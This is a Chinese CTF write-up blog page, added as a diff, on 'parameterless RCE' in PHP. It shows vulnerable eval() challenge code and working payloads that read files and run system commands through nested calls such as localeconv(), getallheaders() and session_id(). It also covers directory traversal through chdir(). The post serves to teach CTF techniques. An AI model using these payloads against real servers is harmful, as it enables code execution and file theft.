@@ -1,0 +1,528 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yuhaojiang.gitee.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="前言无参数RCE方法小总结，可以参考 从一道CTF题学习Fuzz思想 无参数RCE题目例题一题目源码如下 1234567&lt;?phpif(&amp;#x27;;&amp;#x27; &#x3D;&#x3D;&#x3D; preg_replace(&amp;#x27;&#x2F;[^\W]+\((?R)?\)&#x2F;&amp;#x27;, &amp;#x27;&amp;#x27;, $_GET[&amp;#x27;code&amp;#x27;])) &amp;#123;    eval($_GET[&amp;#x27;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="无参数RCE">
+<meta property="og:url" content="https://yuhaojiang.gitee.io/2020/07/18/%E6%97%A0%E5%8F%82%E6%95%B0RCE/index.html">
+<meta property="og:site_name" content="kawhi的博客">
+<meta property="og:description" content="前言无参数RCE方法小总结，可以参考 从一道CTF题学习Fuzz思想 无参数RCE题目例题一题目源码如下 1234567&lt;?phpif(&amp;#x27;;&amp;#x27; &#x3D;&#x3D;&#x3D; preg_replace(&amp;#x27;&#x2F;[^\W]+\((?R)?\)&#x2F;&amp;#x27;, &amp;#x27;&amp;#x27;, $_GET[&amp;#x27;code&amp;#x27;])) &amp;#123;    eval($_GET[&amp;#x27;">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-07-17T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-10-16T03:54:01.231Z">
+<meta property="article:author" content="kawhi">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://yuhaojiang.gitee.io/2020/07/18/%E6%97%A0%E5%8F%82%E6%95%B0RCE/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>无参数RCE | kawhi的博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">kawhi的博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://yuhaojiang.gitee.io/2020/07/18/%E6%97%A0%E5%8F%82%E6%95%B0RCE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="http://yuhaojiang.gitee.io/picture/Blog头像.jpg">
+      <meta itemprop="name" content="kawhi">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="kawhi的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          无参数RCE
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-07-18 00:00:00" itemprop="dateCreated datePublished" datetime="2020-07-18T00:00:00+08:00">2020-07-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-10-16 11:54:01" itemprop="dateModified" datetime="2020-10-16T11:54:01+08:00">2020-10-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h1><p>无参数RCE方法小总结，可以参考</p>
+<p><a class="foo" href="https://xz.aliyun.com/t/6737" target="_blank">从一道CTF题学习Fuzz思想</a></p>
+<h1 id="无参数RCE题目"><a href="#无参数RCE题目" class="headerlink" title="无参数RCE题目"></a><strong>无参数RCE题目</strong></h1><h1 id="例题一"><a href="#例题一" class="headerlink" title="例题一"></a><strong>例题一</strong></h1><p>题目源码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>题目分析：</p>
+<p>其中正则里面的<code>\w</code>表示<code>a-z</code>、<code>A-Z</code>、<code>0-9</code>，以及下划线。<code>(?R)</code>是引用当前表达式的意思，即可以用<code>\w+\((?R)?\)</code>替换到<code>(?R)</code>的位置，<code>(?R)?</code> 这里多一个<code>?</code>表示可以有引用，也就是说可以衍生匹配。</p>
+<p>也就是说<code>/[^\W]+\((?R)?\)/</code>，只匹配<code>字符串+()</code>的类型，并且可以嵌套使用。</p>
+<p>可以看一个例子</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$code1 = <span class="string">&quot;echo();&quot;</span>;</span><br><span class="line">$code2 = <span class="string">&quot;echo(123);&quot;</span>;</span><br><span class="line">$code3 = <span class="string">&quot;echo(phpinfo());&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>(preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $code1));</span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>(preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $code2));</span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>(preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $code3));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>输出</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">;</span><br><span class="line">echo(<span class="number">123</span>);</span><br><span class="line">;</span><br></pre></td></tr></table></figure>
+
+<p>我们分别传入了<code>echo();</code>，<code>echo(123)</code>和<code>echo(phpinfo())</code>，可以看到参数一最终替换剩下一个<code>(;)</code>分号，而参数二无法匹配成功替换失败，参数三是echo嵌套一个phpinfo函数，同样匹配成功替换剩下一个<code>(;)</code>分号。那么这里就说明了我们这个正则虽然不能能够匹配存在参数的函数，但是可以嵌套函数使用。</p>
+<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a><strong>方法一</strong></h3><p>我们知道<code>scandir()</code>函数式能够读取目录源码，但是他必须带有参数<code>（&#39;.&#39;）</code>也就是<code>scandir(&#39;.&#39;)</code>，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> var_dump(scandir(<span class="string">&#x27;.&#x27;</span>)); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>但是上面的正则匹配不允许出现函数里面有点的，所以我们要想办法构造这个点。</p>
+<p>利用<code>localeconv()</code> 取点，<code>localeconv()</code> 会返回当地的金融信息的数组，而第一个元素即为点。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> var_dump(localeconv()); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>构造方法只需取第一个元素即可 <code>pos()</code>、<code>current()</code> 均可。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> var_dump(pos(localeconv())); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>结合起来就是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> var_dump(scandir(pos(localeconv()))); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>使用end读取后一个文件名读取ﬂag</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> var_dump(end(scandir(pos(localeconv())))); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>使用readﬁle读取ﬂag</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> var_dump(readfile(end(scandir(pos(localeconv()))))); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>最终payload</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.107.126.173:8080/code/code.php? code=var_dump(readfile(end(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>
+
+<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a><strong>方法二</strong></h3><p>利用当前秒数构造点  ，利用localtime()中返回的秒数来构造点，点的aiisc码正好是46在60秒之 内，我们只需等到46秒时候就能将点给构造出来。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> var_dump(chr(pos(localtime()))); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>最终payload</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.107.126.173:8080/code/code.php? code=var_dump(readfile(end(scandir(chr(pos(localtime()))))));</span><br></pre></td></tr></table></figure>
+
+<h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a><strong>方法三</strong></h3><p>利用SESSIONID来传参</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.107.126.173:8080/code/code.php? code=show_source(session_id(session_start()));</span><br></pre></td></tr></table></figure>
+
+<p>在cookie处输入</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHPSESSID=flag.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="方法四"><a href="#方法四" class="headerlink" title="方法四"></a><strong>方法四</strong></h3><p>利用 <code>getallheaders()</code> 来获取参数RCE，这里需要用burp抓包操作。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.107.126.173:8080/code/code.php? code=echo(system(end(getallheaders()))); </span><br></pre></td></tr></table></figure>
+
+<p>在最后在最后一条请求头添加</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag.php</span><br></pre></td></tr></table></figure>
+
+<h1 id="例题二"><a href="#例题二" class="headerlink" title="例题二"></a><strong>例题二</strong></h1><p>[GXYCTF2019]禁止套娃，源码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>构造点问题</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">print_r(scandir(current(localeconv())));</span><br><span class="line">print_r(scandir(pos(localeconv())));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这两个都能生成点。</p>
+<p>传参数发现</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(5) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(4) &quot;.git&quot; [3]=&gt; string(8) &quot;flag.php&quot; [4]=&gt; string(9) &quot;index.php&quot; &#125; </span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>exp1</li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>
+
+<p>其中array_reverse是将数组内容反转一下，利用next()指向flag.php文件。</p>
+<ul>
+<li>exp2</li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=show_source(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
+
+<p>其中array_flip()交换数组的键和值，array_rand()从数组中随机取出一个或多个单元</p>
+<p>多刷刷就出flag。</p>
+<ul>
+<li>exp3</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?exp=show_source(session_id(session_start()));</span><br><span class="line">PHPSESSID=flag.php</span><br></pre></td></tr></table></figure>
+
+<h1 id="跳转目录情况"><a href="#跳转目录情况" class="headerlink" title="跳转目录情况"></a><strong>跳转目录情况</strong></h1><ul>
+<li><p>假设ﬂag在上层目录文件的情况，我们需要跳转到上层目录。 </p>
+</li>
+<li><p><code>chdir()</code> 函数当参数为两个点的时候能够跳转到上层目录。<code>scandir()</code> ，读取当前目录在第二个元素就能读取两个点</p>
+</li>
+<li><p><code>localtime</code>第一个参数是时间戳，所以我们不能直接嵌套，需要带一个time函数作为嵌套、time函数能够返回时间戳</p>
+</li>
+<li><p>构造读取上层目录payload</p>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(implode(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))));</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>构造读取上层目录文件payload</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</span><br></pre></td></tr></table></figure>
+
+<h1 id="其他小技巧"><a href="#其他小技巧" class="headerlink" title="其他小技巧"></a><strong>其他小技巧</strong></h1><p>利用三角函数构造斜杠</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chr(floor(tan(tan(atan(atan(ord(cos(fclose(tmpfile())))))))));</span><br></pre></td></tr></table></figure>
+
+<p>利用随机令牌构造点</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(implode(scandir(chr(strrev(uniqid())))));</span><br></pre></td></tr></table></figure>
+
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a><strong>小结</strong></h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">getchwd() 函数返回当前工作目录。</span><br><span class="line">array_reverse() 以相反的元素顺序返回数组</span><br><span class="line">scandir() 函数返回指定目录中的文件和目录的数组。</span><br><span class="line">dirname() 函数返回路径中的目录部分。</span><br><span class="line">chdir()   函数改变当前的目录。</span><br><span class="line">localeconv() 返回当地金融信息，其中包含了点</span><br><span class="line">readfile()   输出一个文件</span><br><span class="line">chr(pos(localtime())) 利用当前秒数构造点    </span><br><span class="line">current()    返回数组中的当前单元, 默认取第一个值</span><br><span class="line">pos()      current() 的别名</span><br><span class="line">next()     函数将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">end()      将内部指针指向数组中的最后一个元素，并输出。</span><br><span class="line">array_rand()   函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机 键名的数组。 </span><br><span class="line">array_flip()   函数用于反转&#x2F;交换数组中所有的键名以及它们关联的键值。</span><br><span class="line">chr()  函数从指定的 ASCII 值返回字符。</span><br><span class="line">hex2bin()  转换十六进制字符串为二进制字符串</span><br><span class="line">getenv()   获取一个环境变量的值(在7.1之后可以不给予参数)</span><br><span class="line">show_source() 高亮读取文件</span><br><span class="line">highlight_file() 高亮读取文件</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/07/18/%E6%97%A0%E5%AD%97%E7%AC%A6%E6%9E%84%E9%80%A0webshell/" rel="prev" title="无字符构造webshell">
+      <i class="fa fa-chevron-left"></i> 无字符构造webshell
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/07/20/NodeJs%E5%AD%A6%E4%B9%A0/" rel="next" title="NodeJs学习">
+      NodeJs学习 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0RCE%E9%A2%98%E7%9B%AE"><span class="nav-number">2.</span> <span class="nav-text">无参数RCE题目</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98%E4%B8%80"><span class="nav-number">3.</span> <span class="nav-text">例题一</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="nav-number">3.0.1.</span> <span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="nav-number">3.0.2.</span> <span class="nav-text">方法二</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89"><span class="nav-number">3.0.3.</span> <span class="nav-text">方法三</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E5%9B%9B"><span class="nav-number">3.0.4.</span> <span class="nav-text">方法四</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98%E4%BA%8C"><span class="nav-number">4.</span> <span class="nav-text">例题二</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B7%B3%E8%BD%AC%E7%9B%AE%E5%BD%95%E6%83%85%E5%86%B5"><span class="nav-number">5.</span> <span class="nav-text">跳转目录情况</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E5%B0%8F%E6%8A%80%E5%B7%A7"><span class="nav-number">6.</span> <span class="nav-text">其他小技巧</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">7.</span> <span class="nav-text">小结</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="kawhi"
+      src="http://yuhaojiang.gitee.io/picture/Blog头像.jpg">
+  <p class="site-author-name" itemprop="name">kawhi</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      友情链接
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.tattooo.top/" title="https:&#x2F;&#x2F;www.tattooo.top" rel="noopener" target="_blank">Tattoo's Blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.plasf.cn/" title="https:&#x2F;&#x2F;www.plasf.cn&#x2F;" rel="noopener" target="_blank">Xiao Leung's Blog</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
